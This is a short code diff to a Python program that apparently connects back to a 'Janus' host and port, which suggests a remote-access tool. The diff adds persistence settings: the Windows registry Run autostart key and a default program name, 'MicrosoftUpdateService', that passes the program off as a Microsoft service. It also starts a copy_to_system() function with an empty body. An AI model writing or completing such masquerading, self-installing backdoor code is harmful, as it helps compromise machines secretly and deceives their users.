@@ -22,7 +22,12 @@ if os.path.exists(env_path):
 
 IP = os.environ.get("JANUS_IP", "127.0.0.1")
 PORT = int(os.environ.get("JANUS_PORT", 443))
+PROGRAM_NAME = os.environ.get("PROGRAM_NAME", "MicrosoftUpdateService")
+REGISTRY_KEY_PATH = os.environ.get("REGISTRY_KEY_PATH", "Software\Microsoft\Windows\CurrentVersion\Run")
 
+
+def copy_to_system():
+    
 
 def connect():
     try:
